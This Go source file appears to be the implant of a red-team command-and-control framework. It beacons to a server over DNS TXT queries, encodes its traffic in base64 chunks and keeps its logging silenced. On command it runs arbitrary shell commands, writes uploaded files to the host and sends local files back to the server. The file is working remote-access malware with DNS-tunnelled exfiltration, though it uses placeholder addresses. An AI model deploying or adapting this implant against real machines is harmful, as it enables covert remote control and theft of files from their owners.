package main

import (
	"encoding/base64"
	"fmt"
	//"log"
	"strings"
	"time"
	"encoding/json"
	"strconv"
	"io/ioutil"
	"runtime"
	"os"
	"os/exec"
	"context"
	"github.com/mattn/go-shellwords"
	"github.com/miekg/dns"
)


// Configuration
type lupoImplant struct {
	updateInterval int
	protocol       string
	dns_domain     string
	rhost          string
	rport          int
	id             int
	uuid           string
	psk            string
	data           string
	pendingFileName    string
	pendingFileContent string
	lastRespTime       time.Time    // Track when last valid response was received
	invalidRespCount   int          // Count consecutive invalid responses
	lastValidResp      string       // Cache last valid response for retry
	failedChunks       map[int]bool // Track which response chunks failed
	failedChunkData    map[int]string // Store partial/failed response chunks
	chunkReassemblyStart time.Time   // Track when chunk reassembly begins
	chunkReassemblyTimeout time.Duration // Max time to spend reassembling chunks
	lastProgressLog    int // Last chunk index where we logged progress
	transferRetryCount int // Track retry attempts (0-50)
	transferTotalChunks int // Store total chunks for retry logic
	transferInProgress bool // Whether transfer is currently being retried
	backgroundTransferActive bool // Whether background transfer goroutine is running
	transferCompletedData string // Data returned from successful background transfer
}

var implant *lupoImplant

func main() {


	implant = &lupoImplant{
		updateInterval: 1,
		protocol:       "DNS",
		dns_domain:     "example.com.",
		rhost:          "127.0.0.1",
		rport:          5333,
		id:             -1,
		uuid:           "",
		psk:            "wolfpack",
		data:           "",
		failedChunks:   make(map[int]bool),
		failedChunkData: make(map[int]string),
		chunkReassemblyTimeout: 5 * time.Minute, // Max 5 minutes to reassemble chunks
		lastProgressLog: 0,
		transferRetryCount: 0,
		transferTotalChunks: 0,
		transferInProgress: false,
		backgroundTransferActive: false,
		transferCompletedData: "",
	}

	for {
		ExecLoop(implant)
		time.Sleep(time.Duration(implant.updateInterval) * time.Second)
	}
}


func ExecLoop(implant *lupoImplant) {
	if implant.id == -1 {
		// Registration message
		regMsg := map[string]interface{}{
			"psk":      implant.psk,
			"register": true,
			"update":   implant.updateInterval,
			"arch":     getArchitecture(),
			"functions": buildCustomFunctions(),
		}

		//fmt.Println(regMsg)

		jsonMsg, err := json.Marshal(regMsg)
		if err != nil {
			//log.Printf("Failed to marshal registration: %v", err)
			return
		}

		//fmt.Println(string(jsonMsg))

		resp, err := sendDNSMessage(implant, string(jsonMsg))
		if err != nil {
			//log.Printf("Failed to send registration: %v", err)
			return
		}

		//fmt.Println("Response: ", resp)

		// Parse registration response (server returns plain JSON in TXT)
		if resp != "" {
			serverResp, err := parseResponse(resp)
			if err != nil {
				//log.Printf("Failed to parse response: %v", err)
				//log.Printf("Raw response was: %s", resp)
				return
			}

			// Safely extract sessionID and UUID
			if sid, ok := serverResp["sessionID"]; ok && sid != nil {
				if sidf, ok := sid.(float64); ok {
					implant.id = int(sidf)
				} else if sids, ok := sid.(string); ok {
					if vi, err := strconv.Atoi(sids); err == nil {
						implant.id = vi
					}
				}
			} else {
				//log.Printf("Registration response missing sessionID, raw: %v", serverResp)
				return
			}

			if uuidv, ok := serverResp["UUID"]; ok && uuidv != nil {
				if ustr, ok := uuidv.(string); ok {
					implant.uuid = ustr
				}
			}
		}
		return
	}

	// Regular check-in message
	checkInMsg := map[string]interface{}{
		"psk":       implant.psk,
		"sessionID": implant.id,
		"UUID":      implant.uuid,
	}

	// Add any pending command output (send raw string; server will display or forward)
	if implant.data != "" {
		checkInMsg["data"] = implant.data
		implant.data = "" // Clear after sending
	}

	// If we have a pending file to upload to server (from a download command), include it
	if implant.pendingFileName != "" && implant.pendingFileContent != "" {
		checkInMsg["filename"] = implant.pendingFileName
		checkInMsg["file"] = implant.pendingFileContent
		implant.pendingFileName = ""
		implant.pendingFileContent = ""
	}

	// Include update interval and arch to mirror HTTP implant behavior
	checkInMsg["update"] = implant.updateInterval
	checkInMsg["arch"] = getArchitecture()

	jsonMsg, err := json.Marshal(checkInMsg)
	if err != nil {
		//log.Printf("Failed to marshal check-in: %v", err)
		return
	}

	resp, err := sendDNSMessage(implant, string(jsonMsg))
	if err != nil {
		//log.Printf("Failed to send check-in: %v", err)
		return
	}

	// Check if background transfer completed successfully
	if implant.transferCompletedData != "" {
		//log.Printf("Background transfer completed successfully, using reassembled data")
		resp = implant.transferCompletedData
		implant.transferCompletedData = ""
		implant.transferInProgress = false
		implant.transferRetryCount = 0
	}

	// If we have a pending transfer retry, check if this is a new response attempt
	if implant.transferInProgress && implant.transferRetryCount > 0 && resp == "" {
		// Background goroutine is handling this, don't start another one
		//log.Printf("Transfer still pending, background retry in progress (attempt %d/50). Will continue on next check-in", implant.transferRetryCount)
		return
	}

	// If this check-in returned no response but we had a pending transfer, start background retry
	if implant.transferInProgress && resp == "" && !implant.backgroundTransferActive {
		//log.Printf("Starting background retry for incomplete transfer (attempt %d/50)...", implant.transferRetryCount)
		implant.backgroundTransferActive = true
		go backgroundTransferRetry(implant)
		return
	}

	// Handle server command
	// Keep retrying DNS queries if we only got ACKs (server still assembling response)
	maxRetries := 10
	retryCount := 0
	for retryCount < maxRetries && resp == "chunk received" {
		//log.Printf("Received chunk ACK, waiting for response (attempt %d/%d)", retryCount+1, maxRetries)
		time.Sleep(200 * time.Millisecond)
		
		// Send a proper check-in message with PSK during retries
		retryMsg := map[string]interface{}{
			"psk":       implant.psk,
			"sessionID": implant.id,
			"UUID":      implant.uuid,
			"data":      "",
			"register":  false,
		}
		jsonBytes, _ := json.Marshal(retryMsg)
		
		var err error
		resp, err = sendDNSMessage(implant, string(jsonBytes))
		if err != nil {
			//log.Printf("Retry query failed: %v", err)
			break
		}
		retryCount++
	}
	
	if resp != "" && resp != "chunk received" {
		
		// Validate base64 before decoding
		if !isValidBase64(resp) {
			//log.Printf("Invalid base64 data received (attempt %d), skipping: %s...", implant.invalidRespCount+1, resp[:min(len(resp), 50)])
			implant.invalidRespCount++
			
			// After 3 consecutive invalid responses, reset and move on
			if implant.invalidRespCount >= 3 {
				//log.Printf("Too many invalid responses, resetting state")
				implant.lastValidResp = ""
				implant.invalidRespCount = 0
			}
			return
		}
		
		// Reset invalid response counter on valid base64
		implant.invalidRespCount = 0
		implant.lastValidResp = resp
		implant.lastRespTime = time.Now()
		
		decodedResp, err := base64.RawURLEncoding.DecodeString(resp)
		if err != nil {
			//log.Printf("base64 decode failed: %v (data length: %d), may need chunk retransmission", err, len(resp))
			implant.invalidRespCount++
			if implant.invalidRespCount >= 3 {
				//log.Printf("Chunk transmission failed 3 times, clearing buffer and moving to next cycle")
				implant.lastValidResp = ""
				implant.invalidRespCount = 0
			}
			return
		}
		resp = string(decodedResp)
		//fmt.Println("Decoded response: ", resp)
		
		var cmdResp map[string]interface{}
		if err := json.Unmarshal([]byte(resp), &cmdResp); err != nil {
			//log.Printf("Failed to parse command: %v", err)
			//log.Printf("Raw response was: %s", resp)
			implant.invalidRespCount++
			if implant.invalidRespCount >= 3 {
				implant.lastValidResp = ""
				implant.invalidRespCount = 0
			}
			return
		}

		// If server requested session reconnect, update id/uuid
		if uuidVal, ok := cmdResp["UUID"]; ok && uuidVal != nil {
			// Safely extract sessionID
			if sid, ok := cmdResp["sessionID"]; ok && sid != nil {
				if sidf, ok := sid.(float64); ok {
					implant.id = int(sidf)
				} else if sids, ok := sid.(string); ok {
					if vi, err := strconv.Atoi(sids); err == nil {
						implant.id = vi
					}
				}
			}
			if ustr, ok := uuidVal.(string); ok {
				implant.uuid = ustr
			}
			implant.invalidRespCount = 0
			return
		}

		if cmdv, ok := cmdResp["cmd"]; ok && cmdv != nil {
			if cmd, ok := cmdv.(string); ok && cmd != "" {
			// Parse command into parts
			parsedCmd, err := shellwords.Parse(cmd)
			if err != nil || len(parsedCmd) == 0 {
				//log.Printf("Failed to parse command string: %v", err)
				return
			}

			root := parsedCmd[0]
			args := parsedCmd[1:]

			if root == "upload" {
				if len(args) < 2 {
					implant.data = "upload: missing arguments"
				} else {
					filename := args[0]
					encData := strings.Join(args[1:], " ")
					// Try StdEncoding then RawURLEncoding
					var fileBytes []byte
					fileBytes, err = base64.StdEncoding.DecodeString(encData)
					if err != nil {
						fileBytes, err = base64.RawURLEncoding.DecodeString(encData)
					}
					if err != nil {
						implant.data = "upload: decode failed: " + err.Error()
					} else {
						if err := ioutil.WriteFile(filename, fileBytes, 0644); err != nil {
							implant.data = "upload: write failed: " + err.Error()
						} else {
							implant.data = "upload: saved " + filename
						}
					}
				}
			} else if root == "download" {
				if len(args) < 1 {
					implant.data = "download: missing filename"
				} else {
					filename := args[0]
					b, err := ioutil.ReadFile(filename)
					if err != nil {
						implant.data = "download: read failed: " + err.Error()
					} else {
						// Use StdEncoding to be compatible with HTTP implant
						enc := base64.StdEncoding.EncodeToString(b)
						implant.pendingFileName = filename
						implant.pendingFileContent = enc
					}
				}
			} else {
				// Execute arbitrary command (with args)
				output := executeCommand(strings.Join(parsedCmd, " "))
				implant.data = output
			}
			// Successfully processed command - reset error counter
			implant.invalidRespCount = 0
		}
	}
}
}

// parseResponse tries to unmarshal a TXT reply that may be raw JSON, a quoted
// JSON string, or an escaped JSON without outer quotes. Returns a map on
// success.
func parseResponse(resp string) (map[string]interface{}, error) {

	// Validate base64 before attempting decode
	if !isValidBase64(resp) {
		return nil, fmt.Errorf("invalid base64 data at input (first 50 chars: %s)", resp[:min(len(resp), 50)])
	}

	decodedResp, err := base64.RawURLEncoding.DecodeString(resp)
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v (data length: %d)", err, len(resp))
	}
	resp = string(decodedResp)
	//fmt.Println("Decoded response: ", resp)
	var m map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &m); err == nil {
		return m, nil
	}

	// Try unquoting (handles escaped JSON like {\"key\":...})
	if u, err := strconv.Unquote("\"" + resp + "\""); err == nil {
		if err2 := json.Unmarshal([]byte(u), &m); err2 == nil {
			return m, nil
		}
	}

	// Maybe it's a quoted JSON string: "{\"key\":...}"
	var inner string
	if err := json.Unmarshal([]byte(resp), &inner); err == nil {
		if err2 := json.Unmarshal([]byte(inner), &m); err2 == nil {
			return m, nil
		}
	}

	return nil, fmt.Errorf("could not parse server response as JSON")
}

// parseServerJSON attempts to parse either a raw JSON object or a
// JSON-encoded string that contains the object (double-encoded).
// parsing simplified: server returns proper JSON; use direct unmarshal

func executeCommand(cmd string) string {
	// Parse the command into words
	parsed, err := shellwords.Parse(cmd)
	if err != nil || len(parsed) == 0 {
		return "Failed to parse command: " + err.Error()
	}

	root := parsed[0]
	args := parsed[1:]

	// Builtin placeholders
	if root == "cd" {
		if len(args) > 0 {
			if err := os.Chdir(strings.Join(args, " ")); err != nil {
				return "cd failed: " + err.Error()
			}
			return ""
		}
		return "cd: missing argument"
	}

	if root == "rootme" {
		return "you're not good enough to be root :("
	}

	if root == "other_func" {
		return "this does nothing it's just a placeholder :)"
	}

	if root == "updateinterval" {
		if len(args) > 0 {
			if v, err := strconv.Atoi(args[0]); err == nil {
				implant.updateInterval = v
				return "Implant interval updated to: " + strconv.Itoa(v)
			} else {
				return "updateinterval: invalid value"
			}
		}
		return "updateinterval: missing value"
	}

	// Execute external command
	out, err := exec.Command(root, args...).Output()
	if err != nil {
		return "Command execution failed: " + err.Error()
	}
	return string(out)
}

// backgroundTransferRetry continuously retries fetching missing chunks in a background goroutine
// It times out after 5 minutes of no responses
func backgroundTransferRetry(implant *lupoImplant) {
	defer func() {
		implant.backgroundTransferActive = false
	}()

	connectionString := fmt.Sprintf("%s:%d", implant.rhost, implant.rport)
	lastChunkReceivedTime := time.Now()
	//retryAttempt := implant.transferRetryCount

	//log.Printf("Background transfer retry started (attempt %d/50)", retryAttempt)

	for {
		// Check 5-minute inactivity timeout
		timeSinceLastChunk := time.Since(lastChunkReceivedTime)
		if timeSinceLastChunk > 5*time.Minute {
			//log.Printf("Background transfer timeout: No chunks received for 5 minutes. Aborting.")
			implant.data = fmt.Sprintf("upload: failed to download file - 5 minute timeout with no responses")
			implant.transferInProgress = false
			implant.transferRetryCount = 0
			return
		}

		// Get list of missing chunks
		missingChunks := make([]int, 0)
		for i := 1; i < implant.transferTotalChunks; i++ {
			if _, isFailed := implant.failedChunks[i]; isFailed {
				if _, exists := implant.failedChunkData[i]; !exists {
					missingChunks = append(missingChunks, i)
				}
			}
		}

		// If no missing chunks reported, try fetching all chunks (in case server re-sent response)
		if len(missingChunks) == 0 {
			for i := 1; i < implant.transferTotalChunks; i++ {
				if _, exists := implant.failedChunkData[i]; !exists {
					missingChunks = append(missingChunks, i)
				}
			}
		}

		if len(missingChunks) == 0 {
			// All chunks received!
			//log.Printf("Background transfer complete! All chunks received.")
			reassembledResp := ""
			for i := 0; i < implant.transferTotalChunks; i++ {
				if data, ok := implant.failedChunkData[i]; ok {
					reassembledResp += data
				}
			}
			implant.transferCompletedData = reassembledResp
			implant.transferInProgress = false
			implant.transferRetryCount = 0
			return
		}

		// Try to fetch one batch of missing chunks
		chunksFetched := 0
		for _, chunkIdx := range missingChunks {
			if chunksFetched >= 5 {
				break // Fetch max 5 chunks per iteration to avoid hammering
			}

			getchunkLabel := fmt.Sprintf("getchunk-%d-%d", implant.id, chunkIdx)
			getchunkFqdn := fmt.Sprintf("%s.%s", getchunkLabel, implant.dns_domain)

			chunkMsg := new(dns.Msg)
			chunkMsg.SetQuestion(getchunkFqdn, dns.TypeTXT)
			chunkMsg.RecursionDesired = false

			c := new(dns.Client)
			c.Timeout = 10 * time.Second

			chunkCtx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
			chunkResp, _, err := c.ExchangeContext(chunkCtx, chunkMsg, connectionString)
			cancel()

			if err == nil && chunkResp != nil && len(chunkResp.Answer) > 0 {
				if txt, ok := chunkResp.Answer[0].(*dns.TXT); ok {
					chunkData := strings.Join(txt.Txt, "")
					chunkParts := strings.SplitN(chunkData, "-", 3)
					if len(chunkParts) == 3 {
						implant.failedChunkData[chunkIdx] = chunkParts[2]
						delete(implant.failedChunks, chunkIdx)
						chunksFetched++
						lastChunkReceivedTime = time.Now() // Reset inactivity timer
						//log.Printf("Background transfer: Successfully fetched chunk %d/%d", chunkIdx, implant.transferTotalChunks-1)
					}
				}
			} else {
				//log.Printf("Background transfer: Failed to fetch chunk %d, will retry", chunkIdx)
			}

			time.Sleep(50 * time.Millisecond)
		}

		// Sleep before next retry iteration
		time.Sleep(500 * time.Millisecond)
	}
}

// reassembleChunks handles the chunked response reassembly logic
// It fetches all chunks and reassembles them into the complete response
func reassembleChunks(implant *lupoImplant, firstChunkResp string, connectionString string) string {
	parts := strings.SplitN(firstChunkResp, "-", 3)
	if len(parts) != 3 {
		return ""
	}

	totalRespChunks, _ := strconv.Atoi(parts[0])
	chunkIndex, _ := strconv.Atoi(parts[1])
	
	if totalRespChunks <= 1 || chunkIndex != 0 {
		return "" // Not a multi-chunk response
	}

	// Start reassembly
	implant.chunkReassemblyStart = time.Now()
	implant.lastProgressLog = 0

	// If this is a new transfer (not a retry), initialize retry counter
	if !implant.transferInProgress {
		implant.transferRetryCount = 1
		implant.transferTotalChunks = totalRespChunks
		implant.transferInProgress = true
		implant.failedChunks = make(map[int]bool)
		implant.failedChunkData = make(map[int]string)
		//log.Printf("Detected chunked response: %d chunks total. Starting background download thread.", totalRespChunks)
	} else {
		// Already in progress, just update retry count
		implant.transferRetryCount++
		//log.Printf("Background thread detected new response for same transfer (retry attempt %d)", implant.transferRetryCount)
	}

	implant.failedChunkData[0] = parts[2] // Store first chunk

	// Start background thread if not already running
	if !implant.backgroundTransferActive {
		implant.backgroundTransferActive = true
		go backgroundTransferRetry(implant)
	}

	// Return empty - let the background thread handle all the downloading
	return ""
}

func sendDNSMessage(implant *lupoImplant, message string) (string, error) {
	// Encode the whole JSON message using RawURLEncoding (no padding), then chunk it
	encodedMsg := base64.RawURLEncoding.EncodeToString([]byte(message))

	//fmt.Println(encodedMsg)

	const maxChunkSize = 40
	chunks := make([]string, 0)
	for i := 0; i < len(encodedMsg); i += maxChunkSize {
		end := i + maxChunkSize
		if end > len(encodedMsg) {
			end = len(encodedMsg)
		}
		chunks = append(chunks, encodedMsg[i:end])
	}

	connectionString := fmt.Sprintf("%s:%d", implant.rhost, implant.rport)
	totalChunks := len(chunks)
	serverResp := ""

	for i, chunk := range chunks {
		// Use hyphen-separated first label: <sessionID>-<chunkIndex>-<totalChunks>-<chunkPayload>
		sessionID := implant.id
		if sessionID == -1 {
			sessionID = 0
		}
		label := fmt.Sprintf("%d-%d-%d-%s", sessionID, i, totalChunks, chunk)
		fqdn := fmt.Sprintf("%s.%s", label, implant.dns_domain)

		msg := new(dns.Msg)
		msg.SetQuestion(fqdn, dns.TypeTXT)
		msg.RecursionDesired = false

		// Retry logic for timeouts
		maxRetries := 3
		var resp *dns.Msg
		var err error
		
		for retryCount := 0; retryCount <= maxRetries; retryCount++ {
			c := new(dns.Client)
			c.Timeout = 10 * time.Second
			resp, _, err = c.Exchange(msg, connectionString)
			
			if err == nil {
				// Success, break out of retry loop
				break
			}
			
			if retryCount < maxRetries {
				//log.Printf("DNS query timeout for chunk %d/%d, retrying (%d/%d)...", i+1, totalChunks, retryCount+1, maxRetries)
				time.Sleep(250 * time.Millisecond)
			} else {
				// Failed after all retries
				return "", fmt.Errorf("DNS query failed after %d retries for chunk %d/%d: %v", maxRetries, i+1, totalChunks, err)
			}
		}

		// Process server response: server returns plain JSON in TXT for non-ack responses
		if resp != nil && len(resp.Answer) > 0 {
			if txt, ok := resp.Answer[0].(*dns.TXT); ok {
				serverResp = strings.Join(txt.Txt, "")
				if serverResp != "chunk received" {
					// Expect plain JSON or chunked response
					break
				}
			}
		}

		//fmt.Println(fqdn)

		time.Sleep(25 * time.Millisecond)
	}

	// Check if response is a chunked response from server (format: totalChunks-chunkIndex-chunkData)
	if serverResp != "" && strings.Count(serverResp, "-") >= 2 {
		parts := strings.SplitN(serverResp, "-", 3)
		if len(parts) == 3 {
			totalRespChunks, _ := strconv.Atoi(parts[0])
			chunkIndex, _ := strconv.Atoi(parts[1])
			if totalRespChunks > 1 && chunkIndex == 0 {
				// This is a chunked response from server, use reassembly helper
				reassembledResp := reassembleChunks(implant, serverResp, connectionString)
				if reassembledResp != "" {
					serverResp = reassembledResp
				} else {
					// Reassembly in progress or failed, return empty
					return "", nil
				}
			}
		}
	}

	return serverResp, nil
}

// Add this new helper function
func sanitizeDNSLabel(s string) string {
    // Remove any characters that could cause DNS issues
    s = strings.Map(func(r rune) rune {
        if (r >= 'a' && r <= 'z') ||
           (r >= 'A' && r <= 'Z') ||
           (r >= '0' && r <= '9') ||
           r == '-' {
            return r
        }
        return '-'
    }, s)

    // Ensure label isn't too long
    if len(s) > 63 {
        return s[:63]
    }

    // Remove consecutive hyphens
    for strings.Contains(s, "--") {
        s = strings.ReplaceAll(s, "--", "-")
    }

    // Ensure label doesn't start or end with hyphen
    s = strings.Trim(s, "-")

    if s == "" {
        return "x" // Ensure we never return empty label
    }

    return s
}

func encodeBase64(input string) string {
	return base64.RawURLEncoding.EncodeToString([]byte(input))
}


func getArchitecture() string {

	arch := runtime.GOOS + "/" + runtime.GOARCH

	return arch

}

func buildCustomFunctions() string {
	custom_functions := []string{
		"\"rootme\":\"gives instant root every time\"",
		"\"other_func\":\"does funky things\""}

	customFunctionStr := "{"
	for index, custom_fun := range custom_functions {

		if index == len(custom_functions)-1 {
			customFunctionStr += custom_fun
		} else {
			customFunctionStr += custom_fun + ","
		}

	}
	customFunctionStr += "}"

	return customFunctionStr
}


func chunkString(data string, maxPayload int) []string {
	chunks := []string{}
	totalChunks := (len(data) + maxPayload - 1) / maxPayload

	for i := 0; i < totalChunks; i++ {
		start := i * maxPayload
		end := start + maxPayload
		if end > len(data) {
			end = len(data)
		}
		chunkData := data[start:end]
		prefix := fmt.Sprintf("%d-%d-", i, totalChunks)
		chunks = append(chunks, prefix+chunkData)
	}

	return chunks
}


// isValidBase64 checks if a string is valid base64 (no padding in RawURLEncoding)
func isValidBase64(s string) bool {
	if len(s) == 0 {
		return false
	}
	
	// RawURLEncoding doesn't use padding, but all chars should be valid
	for _, c := range s {
		if !((c >= 'a' && c <= 'z') ||
			(c >= 'A' && c <= 'Z') ||
			(c >= '0' && c <= '9') ||
			c == '-' || c == '_') {
			return false
		}
	}
	return true
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}